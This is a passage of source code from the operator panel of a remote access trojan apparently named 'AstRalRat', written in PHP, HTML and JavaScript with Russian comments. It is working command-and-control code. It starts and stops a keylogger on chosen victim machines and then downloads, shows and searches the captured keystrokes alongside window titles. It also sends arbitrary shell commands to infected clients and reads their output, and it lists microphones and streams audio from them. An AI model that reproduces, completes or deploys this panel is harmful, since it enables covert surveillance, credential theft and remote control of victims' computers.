    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);
    const canvas = document.getElementById('visualizerCanvas');
    const canvasCtx = canvas.getContext('2d');
    const width = canvas.width;
    const height = canvas.height;

    function draw() {
        visualizationInterval = requestAnimationFrame(draw);
        analyser.getByteFrequencyData(dataArray);

        canvasCtx.fillStyle = '#1a1a1a';
        canvasCtx.fillRect(0, 0, width, height);

        const barWidth = (width / bufferLength) * 2.5;
        let barHeight;
        let x = 0;

        for(let i = 0; i < bufferLength; i++) {
            barHeight = dataArray[i] / 2;

            canvasCtx.fillStyle = `rgb(${barHeight + 100}, 50, 50)`;
            canvasCtx.fillRect(x, height - barHeight, barWidth, barHeight);

            x += barWidth + 1;
        }
    }

    draw();
}

// Функция для переключения паузы/воспроизведения
function togglePlayPause() {
    // В этой реализации мы не можем поставить на паузу отдельный файл,
    // так как мы постоянно переключаемся между файлами
    // Вместо этого мы можем остановить воспроизведение полностью
    if (isPlaying) {
        stopPlayback();
    } else if (audioQueue.length > 0) {
        playNextAudio();
    }
}

// Функция для остановки воспроизведения
function stopPlayback() {
    isPlaying = false;
    currentAudioIndex = audioQueue.length; // Пропускаем оставшиеся файлы
    updatePlaybackButtons(false);
    addLog('Воспроизведение остановлено');

    if (visualizationInterval) {
        cancelAnimationFrame(visualizationInterval);
        visualizationInterval = null;

        // Очищаем визуализатор
        const canvas = document.getElementById('visualizerCanvas');
        const canvasCtx = canvas.getContext('2d');
        canvasCtx.fillStyle = '#1a1a1a';
        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
    }
}

// Функция для установки громкости
function setVolume(volume) {
    // Громкость будет установлена для следующего аудио элемента
    addLog(`Громкость установлена на: ${volume * 100}%`);
}

// Функция для обновления кнопок воспроизведения
function updatePlaybackButtons(playing) {
    const playPauseBtn = document.getElementById('playPauseBtn');
    const stopPlaybackBtn = document.getElementById('stopPlaybackBtn');

    if (playing) {
        playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
        playPauseBtn.disabled = false;
        stopPlaybackBtn.disabled = false;
    } else {
        playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
        playPauseBtn.disabled = audioQueue.length === 0;
        stopPlaybackBtn.disabled = audioQueue.length === 0;
    }
}

// Функция для отправки аудио-команд
function sendAudioCommand(command, clientId) {
    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', clientId);
    formData.append('command', command);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            addLog(`Команда отправлена: ${command}`);

            // Для команды micinfo запрашиваем вывод через секунду
            if (command === 'micinfo') {
                setTimeout(() => {
                    fetchClientOutput(clientId, handleAudioDevicesResponse);
                }, 1500);
            }
        } else {
            addLog(`Ошибка отправки команды: ${data.message || 'неизвестная ошибка'}`);
        }
    })
    .catch(error => {
        addLog(`Ошибка отправки аудио-команды: ${error}`);
    });
}

// Функция для получения вывода от клиента
function fetchClientOutput(clientId, callback) {
    const formData = new FormData();
    formData.append('action', 'get_clients_info');

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.clients && data.clients[clientId] && data.clients[clientId].output) {
            callback(data.clients[clientId].output, clientId);
        } else {
            addLog('Нет данных вывода для клиента');
        }
    })
    .catch(error => {
        addLog(`Ошибка получения вывода клиента: ${error}`);
    });
}

// Обработчик ответа с аудиоустройствами
function handleAudioDevicesResponse(output, clientId) {
    try {
        addLog("Получен ответ от клиента с информацией об аудиоустройствах");

        // Пытаемся найти JSON в выводе
        let jsonData = null;

        // Сначала пробуем распарсить весь вывод как JSON
        try {
            jsonData = JSON.parse(output);
        } catch (e) {
            // Если не получилось, ищем JSON в тексте
            const jsonMatch = output.match(/\[.*\]/s);
            if (jsonMatch) {
                jsonData = JSON.parse(jsonMatch[0]);
            } else {
                addLog('Не удалось найти JSON в выводе');
                return;
            }
        }

        // Заполняем выпадающий список устройств
        const select = document.getElementById('audioDeviceSelect');
        select.innerHTML = '';

        // Добавляем опцию для записи системного звука
        const desktopOption = document.createElement('option');
        desktopOption.value = 'desktop';
        desktopOption.textContent = 'Системный звук (Desktop)';
        select.appendChild(desktopOption);

        if (Array.isArray(jsonData)) {
            jsonData.forEach(device => {
                const option = document.createElement('option');
                option.value = device.name;
                option.textContent = `${device.name} (${device.sample_rate} Hz, ${device.channels} каналов)`;
                select.appendChild(option);
            });

            addLog(`Получено аудиоустройств: ${jsonData.length}`);
        } else {
            addLog('Полученные данные не являются массивом');
        }

        // Настраиваем обработчик выбора устройств
        select.addEventListener('change', updateSelectedDevices);
    } catch (e) {
        addLog(`Ошибка парсинга устройств: ${e}`);
    }
}

// Функция для обновления отображения выбранных устройств
function updateSelectedDevices() {
    const deviceSelect = document.getElementById('audioDeviceSelect');
    const selectedOptions = Array.from(deviceSelect.selectedOptions);
    const selectedDevicesContainer = document.getElementById('selectedDevices');

    selectedDevicesContainer.innerHTML = '';
    selectedDevices = selectedOptions.map(option => option.value);

    selectedOptions.forEach(option => {
        const deviceTag = document.createElement('div');
        deviceTag.className = 'device-tag';
        deviceTag.innerHTML = `
            ${option.textContent}
            <span class="remove" onclick="deselectDevice('${option.value}')">×</span>
        `;
        selectedDevicesContainer.appendChild(deviceTag);
    });
}

// Функция для отмены выбора устройства
function deselectDevice(deviceValue) {
    const deviceSelect = document.getElementById('audioDeviceSelect');
    const options = Array.from(deviceSelect.options);

    const optionToDeselect = options.find(option => option.value === deviceValue);
    if (optionToDeselect) {
        optionToDeselect.selected = false;
        updateSelectedDevices();
    }
}

// Функция для обновления статуса записи
function updateRecordingStatus(isRecording) {
    const recordBtn = document.querySelector('.record-btn');
    const stopBtn = document.querySelector('.stop-btn');

    if (isRecording) {
        recordBtn.disabled = true;
        stopBtn.disabled = false;
    } else {
        recordBtn.disabled = false;
        stopBtn.disabled = true;
    }
}

// Инициализация при загрузке вкладки
document.addEventListener('DOMContentLoaded', function() {
    const audioTab = document.getElementById('audio-tab');
    if (audioTab) {
        // Останавливаем поток при переключении с вкладки
        const tabLinks = document.querySelectorAll('.tab-link');
        tabLinks.forEach(tab => {
            tab.addEventListener('click', function() {
                if (!this.getAttribute('onclick').includes('audio-tab')) {
                    stopAudioStream();
                    stopPlayback();
                }
            });
        });
    }

    // Инициализируем визуализатор
    const canvas = document.getElementById('visualizerCanvas');
    const canvasCtx = canvas.getContext('2d');
    canvasCtx.fillStyle = '#1a1a1a';
    canvasCtx.fillRect(0, 0, canvas.width, canvas.height);

    addLog('Аудиомодуль инициализирован');
});
</script>

<style>
/* Стили для вкладки удаленного CMD */
.cmd-container {
    background: #1a1a2e;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    border: 1px solid rgba(90, 100, 200, 0.15);
}

.cmd-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px 20px;
    background: rgba(30, 30, 46, 0.8);
    border-bottom: 1px solid rgba(90, 100, 200, 0.2);
}

.client-select {
    display: flex;
    align-items: center;
    gap: 12px;
}

.client-select label {
    color: #aab2ff;
    font-weight: 500;
    font-size: 14px;
}

.cmd-controls {
    display: flex;
    gap: 10px;
}

.cmd-btn {
    background: rgba(90, 100, 200, 0.25);
    border: 1px solid rgba(110, 130, 255, 0.3);
    color: #aab2ff;
    width: 40px;
    height: 40px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.cmd-btn:hover {
    background: rgba(110, 130, 255, 0.4);
    transform: translateY(-2px);
}

.console-output {
    height: 400px;
    background: #0c0c14;
    padding: 16px;
    overflow-y: auto;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 14px;
    color: #ccccdd;
    line-height: 1.5;
    border-bottom: 1px solid rgba(90, 100, 200, 0.2);
}

.console-line {
    margin-bottom: 4px;
    white-space: pre-wrap;
    word-break: break-all;
}

.console-line.error {
    color: #ff6b6b;
}

.console-line.success {
    color: #6bff8d;
}

.console-line.info {
    color: #6bacff;
}

.console-line.command {
    color: #ffff00;
    font-weight: bold;
}

.console-input {
    display: flex;
    align-items: center;
    padding: 16px;
    background: rgba(30, 30, 46, 0.8);
}

.prompt {
    color: #6bff8d;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-weight: bold;
    margin-right: 8px;
    font-size: 14px;
}

.console-input input {
    flex: 1;
    padding: 12px 16px;
    border-radius: 8px;
    background: rgba(20, 20, 35, 0.8);
    border: 1px solid rgba(90, 100, 200, 0.2);
    color: #ccccdd;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 14px;
}

.console-input input:focus {
    outline: none;
    border-color: rgba(110, 130, 255, 0.6);
    box-shadow: 0 0 0 2px rgba(110, 130, 255, 0.2);
}

.send-cmd-btn {
    background: linear-gradient(90deg, #6366f1 0%, #7b88ff 100%);
    border: none;
    color: white;
    width: 46px;
    height: 46px;
    border-radius: 8px;
    margin-left: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.send-cmd-btn:hover {
    background: #40444d;
    transform: translateY(-2px);
}

/* Стили для полосы прокрутки консоли */
.console-output::-webkit-scrollbar {
    width: 8px;
}

.console-output::-webkit-scrollbar-track {
    background: #0c0c14;
}

.console-output::-webkit-scrollbar-thumb {
    background: #4d5bce;
    border-radius: 4px;
}

.console-output::-webkit-scrollbar-thumb:hover {
    background: #5d6bde;
}

.console-input input::placeholder {
    color: #6a709c;
    font-style: italic;
}
</style>
<!-- Вкладка "Keylogger" -->
<div id="keylogger" class="tab-content" style="display:none;">
    <h2 class="section-title"><i class="fas fa-keyboard"></i> Кей логгер управление</h2>

    <div class="keylogger-container">
        <!-- Выбор клиента и управление -->
        <div class="keylogger-header">
            <div class="client-select">
                <div class="select-wrapper">
                    <select id="keyloggerClientSelect">
                        <option value="">Выберите клиента</option>
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
            </div>

            <div class="keylogger-controls">
                <button class="keylogger-btn" onclick="startKeylogger()" title="Запустить keylogger">
                    <i class="fas fa-play"></i> Запустить
                </button>
                <button class="keylogger-btn" onclick="stopKeylogger()" title="Остановить keylogger">
                    <i class="fas fa-stop"></i> Остановить
                </button>
                <button class="keylogger-btn" onclick="downloadKeylog()" title="Скачать лог">
                    <i class="fas fa-download"></i> Скачать
                </button>
                <button class="keylogger-btn" onclick="clearKeylog()" title="Очистить лог">
                    <i class="fas fa-trash"></i> Очистить
                </button>
            </div>
        </div>

        <!-- Статус keylogger -->
        <div class="keylogger-status" id="keyloggerStatus">
            <span class="status-indicator"></span>
            <span class="status-text">Неактивен</span>
        </div>

        <!-- Просмотр логов -->
        <div class="keylog-viewer">
            <div class="viewer-header">
                <h3>Записи keylogger</h3>
                <div class="viewer-filters">
                    <input type="text" id="keylogSearch" placeholder="Поиск по логам..." onkeyup="filterKeylogs()">
                    <select id="keylogDateFilter" onchange="filterKeylogs()">
                        <option value="">Все даты</option>
                    </select>
                </div>
            </div>

            <div class="keylog-content" id="keylogContent">
                <div class="no-logs">Логи отсутствуют</div>
            </div>
        </div>
    </div>
</div>

<style>
/* Стили для вкладки Keylogger */
.keylogger-container {
    background: var(--dark-bg);
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
}

.keylogger-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px;
    background: var(--medium-bg);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.keylogger-controls {
    display: flex;
    gap: 10px;
}

.keylogger-btn {
    padding: 8px 16px;
    background: var(--accent);
    border: none;
    color: white;
    border-radius: 4px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.keylogger-btn:hover {
    background: #d32f2f;
}

.keylogger-status {
    display: flex;
    align-items: center;
    padding: 12px 16px;
    background: var(--medium-bg);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.status-indicator {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #f44336;
    margin-right: 10px;
}

.status-indicator.active {
    background: #4CAF50;
    box-shadow: 0 0 10px #4CAF50;
}

.keylog-viewer {
    padding: 16px;
}

.viewer-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 16px;
}

.viewer-filters {
    display: flex;
    gap: 10px;
}

.viewer-filters input,
.viewer-filters select {
    padding: 8px 12px;
    background: var(--dark-bg);
    border: 1px solid rgba(255, 255, 255, 0.1);
    color: var(--light-text);
    border-radius: 4px;
}

.keylog-content {
    height: 400px;
    overflow-y: auto;
    background: var(--dark-bg);
    border-radius: 4px;
    padding: 16px;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 13px;
}

.keylog-entry {
    margin-bottom: 8px;
    padding: 8px;
    border-radius: 4px;
    background: rgba(255, 255, 255, 0.03);
}

.keylog-timestamp {
    color: #64B5F6;
    font-size: 12px;
    margin-bottom: 4px;
}

.keylog-keys {
    color: var(--light-text);
}

.keylog-window {
    color: #FFD54F;
    font-size: 12px;
    margin-top: 4px;
}

.no-logs {
    text-align: center;
    color: rgba(208, 215, 217, 0.5);
    padding: 40px 0;
}

/* Стили для полосы прокрутки */
.keylog-content::-webkit-scrollbar {
    width: 6px;
}

.keylog-content::-webkit-scrollbar-track {
    background: var(--dark-bg);
}

.keylog-content::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.2);
    border-radius: 3px;
}

.keylog-content::-webkit-scrollbar-thumb:hover {
    background: rgba(255, 255, 255, 0.3);
}
</style>

<script>
// Переменные для управления keylogger
let keyloggerStatus = 'inactive';
let keylogRefreshInterval = null;

// Функции для работы с keylogger
function startKeylogger() {
    const clientId = document.getElementById('keyloggerClientSelect').value;
    if (!clientId) {
        showToast('error', 'Сначала выберите клиента');
        return;
    }

    // Отправляем команду запуска keylogger
    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', clientId);
    formData.append('command', 'keylogger_start');

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            showToast('success', 'Keylogger запущен');
            updateKeyloggerStatus('active');

            // Запускаем обновление логов
            if (!keylogRefreshInterval) {
                keylogRefreshInterval = setInterval(loadKeylogs, 3000);
            }
        } else {
            showToast('error', 'Ошибка запуска keylogger: ' + (data.message || 'неизвестная ошибка'));
        }
    })
    .catch(error => {
        console.error('Error starting keylogger:', error);
        showToast('error', 'Ошибка запуска keylogger');
    });
}

function stopKeylogger() {
    const clientId = document.getElementById('keyloggerClientSelect').value;
    if (!clientId) {
        showToast('error', 'Сначала выберите клиента');
        return;
    }

    // Отправляем команду остановки keylogger
    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', clientId);
    formData.append('command', 'keylogger_stop');

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            showToast('success', 'Keylogger остановлен');
            updateKeyloggerStatus('inactive');

            // Останавливаем обновление логов
            if (keylogRefreshInterval) {
                clearInterval(keylogRefreshInterval);
                keylogRefreshInterval = null;
            }
        } else {
            showToast('error', 'Ошибка остановки keylogger: ' + (data.message || 'неизвестная ошибка'));
        }
    })
    .catch(error => {
        console.error('Error stopping keylogger:', error);
        showToast('error', 'Ошибка остановки keylogger');
    });
}

function downloadKeylog() {
    const clientId = document.getElementById('keyloggerClientSelect').value;
    if (!clientId) {
        showToast('error', 'Сначала выберите клиента');
        return;
    }

    // Создаем ссылку для скачивания
    const a = document.createElement('a');
    a.href = `keylogs/${clientId}.log`;
    a.download = `keylog_${clientId}_${new Date().toISOString().slice(0, 10)}.log`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function clearKeylog() {
    const clientId = document.getElementById('keyloggerClientSelect').value;
    if (!clientId) {
        showToast('error', 'Сначала выберите клиента');
        return;
    }

    // Отправляем запрос на очистку логов
    const formData = new FormData();
    formData.append('action', 'clear_keylog');
    formData.append('client_id', clientId);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            showToast('success', 'Логи keylogger очищены');
            document.getElementById('keylogContent').innerHTML = '<div class="no-logs">Логи отсутствуют</div>';
        } else {
            showToast('error', 'Ошибка очистки логов: ' + (data.message || 'неизвестная ошибка'));
        }
    })
    .catch(error => {
        console.error('Error clearing keylog:', error);
        showToast('error', 'Ошибка очистки логов');
    });
}

function loadKeylogs() {
    const clientId = document.getElementById('keyloggerClientSelect').value;
    if (!clientId) return;

    fetch(`keylogs/${clientId}.log?t=${new Date().getTime()}`)
    .then(response => {
        if (!response.ok) {
            throw new Error('Файл логов не найден');
        }
        return response.text();
    })
    .then(logData => {
        if (!logData.trim()) {
            document.getElementById('keylogContent').innerHTML = '<div class="no-logs">Логи отсутствуют</div>';
            return;
        }

        // Парсим и отображаем логи
        displayKeylogs(logData);

        // Обновляем фильтр дат
        updateDateFilter(logData);
    })
    .catch(error => {
        // Не показываем ошибку, если файл не существует
        if (!error.message.includes('Файл логов не найден')) {
            console.error('Error loading keylogs:', error);
        }
    });
}

function displayKeylogs(logData) {
    const logContent = document.getElementById('keylogContent');
    const logs = logData.split('\n').filter(line => line.trim());

    if (logs.length === 0) {
        logContent.innerHTML = '<div class="no-logs">Логи отсутствуют</div>';
        return;
    }

    let html = '';
    logs.forEach(log => {
        // Парсим запись лога (формат: [timestamp] window: [window_title] keys: [key_data])
        const match = log.match(/\[(.*?)\]\s+window:\s+(.*?)\s+keys:\s+(.*)/);
        if (match) {
            const timestamp = match[1];
            const windowTitle = match[2];
            const keys = match[3];

            html += `
                <div class="keylog-entry">
                    <div class="keylog-timestamp">${timestamp}</div>
                    <div class="keylog-keys">${keys}</div>
                    <div class="keylog-window">${windowTitle}</div>
                </div>
            `;
        }
    });

    logContent.innerHTML = html;
    logContent.scrollTop = logContent.scrollHeight;
}

function updateDateFilter(logData) {
    const dateFilter = document.getElementById('keylogDateFilter');
    const dates = new Set();
    const logs = logData.split('\n').filter(line => line.trim());

    logs.forEach(log => {
        const match = log.match(/\[(.*?)\]/);
        if (match) {
            const date = match[1].split(' ')[0]; // Извлекаем только дату
            dates.add(date);
        }
    });

    // Очищаем и обновляем опции фильтра
    dateFilter.innerHTML = '<option value="">Все даты</option>';
    dates.forEach(date => {
        const option = document.createElement('option');
        option.value = date;
        option.textContent = date;
        dateFilter.appendChild(option);
    });
}

function filterKeylogs() {
    const searchText = document.getElementById('keylogSearch').value.toLowerCase();
    const dateFilter = document.getElementById('keylogDateFilter').value;
    const entries = document.querySelectorAll('.keylog-entry');

    entries.forEach(entry => {
        const timestamp = entry.querySelector('.keylog-timestamp').textContent;
        const keys = entry.querySelector('.keylog-keys').textContent.toLowerCase();
        const windowTitle = entry.querySelector('.keylog-window').textContent.toLowerCase();

        const matchesSearch = !searchText || keys.includes(searchText) || windowTitle.includes(searchText);
        const matchesDate = !dateFilter || timestamp.includes(dateFilter);

        entry.style.display = matchesSearch && matchesDate ? 'block' : 'none';
    });
}

function updateKeyloggerStatus(status) {
    keyloggerStatus = status;
    const indicator = document.querySelector('.status-indicator');
    const statusText = document.querySelector('.status-text');

    if (status === 'active') {
        indicator.classList.add('active');
        statusText.textContent = 'Активен';
    } else {
        indicator.classList.remove('active');
        statusText.textContent = 'Неактивен';
    }
}

// Инициализация при открытии вкладки
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('keylogger').addEventListener('click', function() {
        // Загружаем логи при открытии вкладки
        setTimeout(loadKeylogs, 500);

        // Запускаем периодическое обновление
        if (!keylogRefreshInterval) {
            keylogRefreshInterval = setInterval(loadKeylogs, 3000);
        }
    });

    // Останавливаем обновление при переключении вкладок
    document.querySelectorAll('.tab-link').forEach(tab => {
        tab.addEventListener('click', function() {
            if (this.getAttribute('onclick').includes('keylogger')) return;
            if (keylogRefreshInterval) {
                clearInterval(keylogRefreshInterval);
                keylogRefreshInterval = null;
            }
        });
    });
});
</script>
<!-- Вкладка "Удаленная командная строка" -->
<div id="remote-cmd" class="tab-content" style="display:none;">
    <h2 class="section-title"><i class="fas fa-terminal"></i> Удаленная командная строка</h2>

    <div class="cmd-container">
        <!-- Выбор клиента -->
        <div class="cmd-header">
            <div class="client-select">
                <div class="select-wrapper">
                    <select id="cmdClientSelect">
                        <option value="">Выберите клиента</option>
                        <?php foreach($data['clients'] as $client_id => $client): ?>
                            <option value="<?php echo htmlspecialchars($client_id); ?>">
                                <?php echo htmlspecialchars($client_id); ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                </div>
            </div>

            <div class="cmd-controls">
                <button class="cmd-btn" onclick="clearConsole()" title="Очистить консоль">
                    <i class="fas fa-broom"></i>
                </button>
                <button class="cmd-btn" onclick="clearCommandHistory()" title="Удалить историю команд">
                    <i class="fas fa-trash-alt"></i>
                </button>
                <button class="btn-icon"
                        onclick="sendCommandToSelectedClient('infopc', 'Команда для получения информации')"
                        title="Info">
                    <i class="fas fa-info-circle fa-2x text-info"></i>
                </button>
            </div>
        </div>

        <!-- Модальное окно для отображения информации о системе -->
        <div id="systemInfoModal" class="modal" style="display:none;">
            <div class="modal-content">
                <span class="close" onclick="closeSystemInfoModal()">&times;</span>
                <h2>Информация о системе</h2>
                <div id="systemInfoContent"></div>
            </div>
        </div>


        <!-- Добавьте этот скрипт в ваш файл -->
        <script>
        function sendCommandToSelectedClient(command, toastMessage) {
            const selectedClient = document.getElementById('cmdClientSelect').value;
            if (!selectedClient) {
                showToast('error', 'Сначала выберите клиента');
                return;
            }
            sendCommand(selectedClient, command);
            showToast('info', toastMessage);
        }
        </script>



        <!-- Окно вывода консоли -->
        <div class="console-output" id="consoleOutput">
            <div class="console-line">Remote CMD Console [AstRalRat]</div>
            <div class="console-line">——————————————————————————————</div>
        </div>

        <!-- Строка ввода команды -->
        <div class="console-input">
            <span class="prompt">></span>
            <input type="text" id="cmdInput" placeholder="Введите команду..." autocomplete="off">
            <button class="send-cmd-btn" onclick="sendCommandToClient()">
                <i class="fas fa-paper-plane"></i>
            </button>
        </div>
    </div>
</div>

<style>
/* Основные цвета */
:root {
    --dark-bg: #1a1a1a;
    --medium-bg: #1a1a1a;
    --light-text: #d0d7d9;
    --accent: #1a1a1a;
}

/* Стили для вкладки удаленного CMD */
.cmd-container {
    background: var(--dark-bg);
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
}

.cmd-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 16px;
    background: var(--medium-bg);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.client-select {
    flex: 1;
}

.select-wrapper {
    position: relative;
}

.select-wrapper::after {
    content: "▼";
    font-size: 10px;
    color: var(--light-text);
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
    opacity: 0.7;
}

.select-wrapper select {
    width: 100%;
    padding: 8px 12px;
    background: var(--dark-bg);
    border: 1px solid rgba(255, 255, 255, 0.1);
    color: var(--light-text);
    border-radius: 4px;
    appearance: none;
    font-size: 14px;
}

.select-wrapper select:focus {
    outline: none;
    border-color: var(--accent);
}

.cmd-controls {
    display: flex;
    gap: 8px;
    margin-left: 12px;
}

.cmd-btn {
    background: transparent;
    border: 1px solid rgba(255, 255, 255, 0.1);
    color: var(--light-text);
    width: 32px;
    height: 32px;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
    opacity: 0.8;
}

.cmd-btn:hover {
    background: rgba(255, 255, 255, 0.05);
    opacity: 1;
}

.cmd-btn.danger {
    color: var(--accent);
}

.cmd-btn.danger:hover {
    background: rgba(237, 66, 69, 0.1);
}

.console-output {
    height: 400px;
    background: var(--dark-bg);
    padding: 16px;
    overflow-y: auto;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 13px;
    color: var(--light-text);
    line-height: 1.4;
}

.console-line {
    margin-bottom: 4px;
    white-space: pre-wrap;
    word-break: break-all;
}

.console-line.error {
    color: var(--accent);
}

.console-line.success {
    color: #4CAF50;
}

.console-line.info {
    color: #64B5F6;
}

.console-line.command {
    color: #FFD54F;
}

.console-input {
    display: flex;
    align-items: center;
    padding: 12px 16px;
    background: var(--medium-bg);
    border-top: 1px solid rgba(255, 255, 255, 0.05);
}

.prompt {
    color: var(--accent);
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-weight: bold;
    margin-right: 8px;
    font-size: 14px;
}

.console-input input {
    flex: 1;
    padding: 8px 12px;
    border-radius: 4px;
    background: var(--dark-bg);
    border: 1px solid rgba(255, 255, 255, 0.1);
    color: var(--light-text);
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 13px;
}

.console-input input:focus {
    outline: none;
    border-color: var(--accent);
}

.send-cmd-btn {
    background: var(--accent);
    border: none;
    color: white;
    width: 36px;
    height: 36px;
    border-radius: 4px;
    margin-left: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.send-cmd-btn:hover {
    background: #d32f2f;
}

/* Стили для полосы прокрутки консоли */
.console-output::-webkit-scrollbar {
    width: 6px;
}

.console-output::-webkit-scrollbar-track {
    background: var(--dark-bg);
}

.console-output::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.2);
    border-radius: 3px;
}

.console-output::-webkit-scrollbar-thumb:hover {
    background: rgba(255, 255, 255, 0.3);
}

.console-input input::placeholder {
    color: rgba(208, 215, 217, 0.4);
}

.section-title {
    font-size: 1.5rem;
    margin-bottom: 20px;

    display: flex;
    align-items: center;
    font-weight: 400;
}

.section-title i {
    margin-right: 10px;

}
</style>

<script>
// Переменные для управления состоянием
let commandHistory = {};
let lastHistoryUpdate = 0;
let historyRefreshInterval = null;

// Функции для работы с удаленной консолью
function sendCommandToClient() {
    const clientId = document.getElementById('cmdClientSelect').value;
    const command = document.getElementById('cmdInput').value.trim();

    if (!clientId) {
        addConsoleLine('error', 'Ошибка: не выбран клиент');
        return;
    }

    if (!command) {
        addConsoleLine('error', 'Ошибка: не введена команда');
        return;
    }

    // Добавляем введенную команду в консоль
    addConsoleLine('command', `> ${command}`);

    // Отправляем команду на сервер
    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', clientId);
    formData.append('command', command);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            addConsoleLine('info', 'Команда отправлена клиенту');
        } else {
            addConsoleLine('error', 'Ошибка отправки команды: ' + (data.message || 'неизвестная ошибка'));
        }
    })
    .catch(error => {
        console.error('Error sending command:', error);
        addConsoleLine('error', 'Ошибка отправки команды');
    });

    // Очищаем поле ввода
    document.getElementById('cmdInput').value = '';
}

function loadCommandHistory() {
    const clientId = document.getElementById('cmdClientSelect').value;
    if (!clientId) return;

    fetch('output_history.json?' + new Date().getTime())
    .then(response => {
        if (!response.ok) {
            throw new Error('Файл истории не найден');
        }
        return response.json();
    })
    .then(historyData => {
        if (!Array.isArray(historyData)) {
            addConsoleLine('error', 'Неверный формат истории');
            return;
        }

        // Фильтруем записи для выбранного клиента
        const clientHistory = historyData.filter(entry => entry.client_id === clientId);

        // Отображаем только новые записи (после последнего обновления)
        const newEntries = clientHistory.filter(entry => entry.timestamp > lastHistoryUpdate);

        if (newEntries.length > 0) {
            // Обновляем время последнего обновления
            lastHistoryUpdate = Math.max(...newEntries.map(entry => entry.timestamp));

            // Добавляем новые записи в консоль
            newEntries.forEach(entry => {
                addConsoleLine('response', entry.output);
            });
        }
    })
    .catch(error => {
        // Не показываем ошибку, если файл не существует
        if (!error.message.includes('Файл истории не найден')) {
            console.error('Error loading command history:', error);
        }
    });
}

function clearConsole() {
    // Останавливаем интервал обновления
    if (historyRefreshInterval) {
        clearInterval(historyRefreshInterval);
        historyRefreshInterval = null;
    }

    // Очищаем консоль
    document.getElementById('consoleOutput').innerHTML = '';

    // Добавляем начальное сообщение
    addConsoleLine('info', 'Консоль очищена');
    addConsoleLine('info', '——————————————————————————————');

    // Перезапускаем интервал обновления через 2 секунды
    setTimeout(() => {
        if (!historyRefreshInterval) {
            historyRefreshInterval = setInterval(loadCommandHistory, 3000);
        }
    }, 2000);
}

function clearCommandHistory() {
    const clientId = document.getElementById('cmdClientSelect').value;
    if (!clientId) {
        addConsoleLine('error', 'Ошибка: не выбран клиент');
        return;
    }

    // Отправляем запрос на очистку истории команд
    const formData = new FormData();
    formData.append('action', 'clear_history');
    formData.append('client_id', clientId);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            addConsoleLine('success', 'История команд очищена');
            clearConsole();
        } else {
            addConsoleLine('error', 'Ошибка очистки истории: ' + (data.message || 'неизвестная ошибка'));
        }
    })
    .catch(error => {
        console.error('Error clearing history:', error);
        addConsoleLine('error', 'Ошибка очистки истории');
    });
}

function addConsoleLine(type, text) {
    const consoleOutput = document.getElementById('consoleOutput');
    const line = document.createElement('div');
    line.className = `console-line ${type}`;

    // Форматируем многострочный вывод
    const lines = text.split('\n');
    if (lines.length > 1) {
        line.innerHTML = lines.map(l => {
            return l ? `<div>${l}</div>` : '<br>';
        }).join('');
    } else {
        line.textContent = text;
    }

